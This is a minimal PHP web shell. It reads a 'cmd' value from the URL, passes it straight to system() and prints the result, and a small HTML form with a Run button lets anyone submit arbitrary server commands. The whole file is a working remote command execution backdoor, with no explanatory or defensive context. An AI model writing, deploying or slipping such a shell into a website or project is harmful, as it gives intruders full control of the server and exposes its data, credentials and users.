<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    $cmd = $_GET['cmd'];
    system($cmd);
    echo "</pre>";
}
?>
<form>
    <input type="text" name="cmd" value="<?php echo htmlspecialchars($_GET['cmd'] ?? 'id'); ?>">
    <button type="submit">Run</button>
</form>